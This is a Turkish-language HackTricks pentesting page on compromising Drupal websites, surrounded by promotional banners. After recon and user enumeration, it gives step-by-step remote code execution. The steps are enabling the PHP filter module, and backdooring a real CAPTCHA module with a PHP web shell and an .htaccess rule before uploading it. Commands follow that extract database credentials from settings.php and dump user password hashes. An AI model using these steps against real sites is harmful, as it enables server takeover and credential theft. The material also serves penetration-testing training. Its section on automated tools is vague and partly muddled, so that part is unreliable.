# Drupal

<details>

<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile</strong>!</summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>

## Keşif

* **Meta**yı kontrol edin
```bash
curl https://www.drupal.org/ | grep 'content="Drupal'
```
* **Node**: Drupal, içeriği **düğümler kullanarak indeksler**. Bir düğüm, blog yazısı, anket, makale vb. gibi herhangi bir şeyi **içerebilir**. Sayfa URI'leri genellikle `/node/<düğüm kimliği>` şeklindedir.
```bash
curl drupal-site.com/node/1
```
## Numaralandırma

Drupal varsayılan olarak **üç tür kullanıcıyı** destekler:

1. **`Yönetici`**: Bu kullanıcı Drupal web sitesi üzerinde tam kontrol sahibidir.
2. **`Doğrulanmış Kullanıcı`**: Bu kullanıcılar web sitesine giriş yapabilir ve izinlerine bağlı olarak makale ekleyebilir ve düzenleyebilir.
3. **`Anonim`**: Tüm web sitesi ziyaretçileri anonim olarak belirlenir. Varsayılan olarak, bu kullanıcılara yalnızca gönderileri okuma izni verilir.

### Sürüm

* `/CHANGELOG.txt` dosyasını kontrol edin.
```bash
curl -s http://drupal-site.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```
{% hint style="info" %}
Drupal'un daha yeni sürümleri, varsayılan olarak `CHANGELOG.txt` ve `README.txt` dosyalarına erişimi engeller.
{% endhint %}

### Kullanıcı adı tespiti

#### Kayıt ol

_/user/register_ adresinde bir kullanıcı adı oluşturmayı deneyin ve eğer ad zaten alınmışsa bildirim alırsınız:

![](<../../.gitbook/assets/image (254).png>)

#### Yeni şifre talebi

Mevcut bir kullanıcı adı için yeni bir şifre talep ederseniz:

![](<../../.gitbook/assets/image (255).png>)

Mevcut olmayan bir kullanıcı adı için yeni bir şifre talep ederseniz:

![](<../../.gitbook/assets/image (256).png>)

### Kullanıcı sayısını alma

_/user/\<number>_ adresine erişerek mevcut kullanıcı sayısını görebilirsiniz, bu durumda _/users/3_ bir bulunamadı hatası döndürür:

![](<../../.gitbook/assets/image (257).png>)

![](<../../.gitbook/assets/image (227) (1) (1).png>)

### Gizli sayfalar

**`/node/$` şeklinde bir sayfayı taramaya çalışın** (`$` 1 ile 500 arasında bir sayı olabilir).\
Bu şekilde, arama motorları tarafından referans alınmayan **gizli sayfalar** bulabilirsiniz.

#### Yüklü modüllerin bilgisi
```bash
#From https://twitter.com/intigriti/status/1439192489093644292/photo/1
#Get info on installed modules
curl https://example.com/config/sync/core.extension.yml
curl https://example.com/core/core.services.yml

# Download content from files exposed in the previous step
curl https://example.com/config/sync/swiftmailer.transport.yml
```
### Otomatik

Drupal, bir web uygulaması güvenlik taraması yaparken kullanılabilecek bir dizi otomatik araç sunar. Bu araçlar, Drupal web sitelerinde yaygın olarak bulunan güvenlik açıklarını tespit etmek ve istismar etmek için kullanılabilir. Aşağıda, Drupal için kullanılabilecek bazı otomatik araçlar ve teknikler bulunmaktadır:

- **Drupwn**: Bu araç, Drupal web sitelerindeki güvenlik açıklarını tespit etmek için kullanılır. Drupwn, Drupal web sitelerindeki modüllerin ve temaların güvenlik durumunu kontrol eder ve potansiyel zayıf noktaları belirler.

- **Droopescan**: Bu araç, Drupal web sitelerindeki güvenlik açıklarını tespit etmek için kullanılır. Droopescan, Drupal web sitelerindeki sürüm bilgilerini ve kullanılan modüllerin güvenlik durumunu kontrol eder.

- **Drupalgeddon**: Bu, Drupal web sitelerindeki Drupalgeddon güvenlik açığına saldırmak için kullanılan bir araçtır. Drupalgeddon, Drupal web sitelerindeki güvenlik açıklarını istismar etmek için kullanılan bir dizi saldırı vektörünü otomatik olarak tespit eder.

Bu otomatik araçlar, Drupal web sitelerindeki güvenlik açıklarını tespit etmek ve istismar etmek için kullanılabilir. Ancak, bu araçların kullanımı yasal ve etik sınırlar içinde olmalıdır.
```bash
droopescan scan drupal -u http://drupal-site.local
```
## Uzaktan Kod Çalıştırma (RCE)

### PHP Filtre Modülü ile

{% hint style="warning" %}
Eski Drupal sürümlerinde **(8'den önceki sürümler)**, yönetici olarak giriş yaparak **`PHP filtre` modülünü etkinleştirmek** mümkündü, bu da "Gömülü PHP kodu/snipetlerinin değerlendirilmesine izin verir."
{% endhint %}

**Plugin php'nin yüklü olması gerekmektedir** (onu kontrol etmek için _/modules/php_ adresine erişin ve **403** dönüyorsa, **var demektir**, **bulunamazsa**, **plugin php yüklü değildir**)

_Modüller_ -> (**Kontrol Et**) _PHP Filtre_ -> _Yapılandırmayı Kaydet_

![](<../../.gitbook/assets/image (247) (1).png>)

Ardından _İçerik Ekle_ -> _Temel Sayfa_ veya _Makale_ seçin -> _Gövdeye php kabuk kodunu yazın_ -> _Metin biçiminde_ _PHP kodu_ seçin -> _Önizleme_ seçin

![](<../../.gitbook/assets/image (253) (1).png>)

Son olarak, yeni oluşturulan düğüme erişin:
```bash
curl http://drupal-site.local/node/3
```
### PHP Filtre Modülünü Yükle

**8 ve sonraki sürümlerde**, [**PHP Filtre**](https://www.drupal.org/project/php/releases/8.x-1.1) **modülü varsayılan olarak yüklenmez**. Bu işlevselliği kullanabilmek için **modülü kendimiz yüklememiz gerekmektedir**.

1. Modülün en güncel sürümünü Drupal web sitesinden indirin.
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. İndirildikten sonra **`Yönetim`** > **`Raporlar`** > **`Kullanılabilir güncellemeler`** bölümüne gidin.
3. **`Göz at`** düğmesine tıklayın, indirdiğimiz dosyayı seçin ve ardından **`Yükle`** düğmesine tıklayın.
4. Modül yüklendikten sonra **`İçerik`** bölümüne tıklayabilir ve Drupal 7 örneğinde yaptığımız gibi **yeni bir temel sayfa oluşturabilirsiniz**. Yine, **`Metin biçimi`** açılır menüsünden **`PHP kodu`**'nu seçtiğinizden emin olun.

### Arka Kapılı Modül

Bir arka kapılı modül, **mevcut bir modüle bir kabuk ekleyerek oluşturulabilir**. Modüller drupal.org web sitesinde bulunabilir. Örneğin [CAPTCHA](https://www.drupal.org/project/captcha) gibi bir modül seçelim. Aşağı kaydırın ve tar.gz [arşivi](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz) için bağlantıyı kopyalayın.

* Arşivi indirin ve içeriğini çıkarın.
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* İçeriğiyle birlikte bir **PHP web kabuğu** oluşturun:
```php
<?php
system($_GET["cmd"]);
?>
```
* Ardından, kendimize klasöre erişim sağlamak için bir **`.htaccess`** dosyası oluşturmamız gerekiyor. Bu, Drupal'ın **`/modules`** klasörüne doğrudan erişimi reddettiği için gereklidir.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* Yukarıdaki yapılandırma, /modules içinde bir dosya istediğimizde / klasörü için kurallar uygulayacaktır. Bu iki dosyayı captcha klasörüne kopyalayın ve bir arşiv oluşturun.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* Varsayalım ki web sitesine **yönetici erişimi** sahibiz, kenar çubuğunda **`Yönet`** üzerine tıklayın ve ardından **`Genişlet`** üzerine tıklayın. Sonra, **`+ Yeni modül yükle`** düğmesine tıklayın ve yükleme sayfasına yönlendirileceğiz, örneğin `http://drupal-site.local/admin/modules/install` Bağlantıya tıklayarak, geri kapı ekli Captcha arşivine göz atın ve **`Yükle`** düğmesine tıklayın.
* Kurulum başarılı olduğunda, komutları yürütmek için **`/modules/captcha/shell.php`** adresine göz atın.

## Son Exploit

### settings.php dosyasını okuyun
```
find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null
```
### Veritabanından Kullanıcıları Dökümle

```bash
# Dump users from DB
drush sql-query "SELECT name, pass FROM users"
```

Bu komut, Drupal veritabanından kullanıcı adlarını ve şifrelerini döker.
```
mysql -u drupaluser --password='2r9u8hu23t532erew' -e 'use drupal; select * from users'
```
## Referanslar

* [https://academy.hackthebox.com/module/113/section/1209](https://academy.hackthebox.com/module/113/section/1209)

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmaya kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.

</details>
